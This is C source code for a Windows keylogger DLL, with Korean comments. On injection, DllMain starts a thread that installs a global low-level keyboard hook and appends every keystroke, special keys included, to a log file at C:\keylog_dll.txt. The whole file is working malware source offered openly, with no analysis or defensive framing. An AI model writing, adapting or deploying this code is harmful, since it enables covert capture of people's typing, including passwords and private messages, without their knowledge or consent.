#include <windows.h>
#include <stdio.h>

#define LOG_FILE "C:\\keylog_dll.txt"

HHOOK hKeyboardHook;
HINSTANCE hInstance;

// 키 이름 매핑
const char* GetKeyName(int vkCode) {
    switch(vkCode) {
        case VK_BACK: return "[BACKSPACE]";
        case VK_RETURN: return "[ENTER]\n";
        case VK_SPACE: return " ";
        case VK_TAB: return "[TAB]";
        case VK_SHIFT: return "[SHIFT]";
        case VK_CONTROL: return "[CTRL]";
        case VK_ESCAPE: return "[ESC]";
        default: return NULL;
    }
}

// 키보드 후킹 콜백
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *kbStruct = (KBDLLHOOKSTRUCT*)lParam;
        int vkCode = kbStruct->vkCode;
        
        FILE *logFile = fopen(LOG_FILE, "a");
        if (logFile != NULL) {
            const char* keyName = GetKeyName(vkCode);
            if (keyName != NULL) {
                fprintf(logFile, "%s", keyName);
            }
            else if (vkCode >= 0x30 && vkCode <= 0x5A) {
                BOOL shift = GetAsyncKeyState(VK_SHIFT) & 0x8000;
                BOOL capsLock = GetKeyState(VK_CAPITAL) & 0x0001;
                
                char key = vkCode;
                if (vkCode >= 0x41 && vkCode <= 0x5A) {
                    if (!(shift ^ capsLock)) {
                        key = key + 32;
                    }
                }
                fprintf(logFile, "%c", key);
            }
            fflush(logFile);
            fclose(logFile);
        }
    }
    
    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

// DLL 시작 함수
DWORD WINAPI KeyloggerThread(LPVOID lpParam) {
    // 로그 파일 초기화
    FILE *logFile = fopen(LOG_FILE, "a");
    if (logFile) {
        fprintf(logFile, "\n=== Keylogger DLL Injected ===\n");
        fclose(logFile);
    }
    
    // 키보드 후킹 설치
    hKeyboardHook = SetWindowsHookEx(
        WH_KEYBOARD_LL,
        KeyboardProc,
        hInstance,
        0
    );
    
    if (hKeyboardHook == NULL) {
        return 1;
    }
    
    // 메시지 루프
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    UnhookWindowsHookEx(hKeyboardHook);
    return 0;
}

// DLL 메인
BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    hInstance = hModule;
    
    switch(dwReason) {
        case DLL_PROCESS_ATTACH:
            // DLL이 주입되면 키로거 스레드 시작
            CreateThread(NULL, 0, KeyloggerThread, NULL, 0, NULL);
            break;
        case DLL_PROCESS_DETACH:
            if (hKeyboardHook != NULL) {
                UnhookWindowsHookEx(hKeyboardHook);
            }
            break;
    }
    
    return TRUE;
}
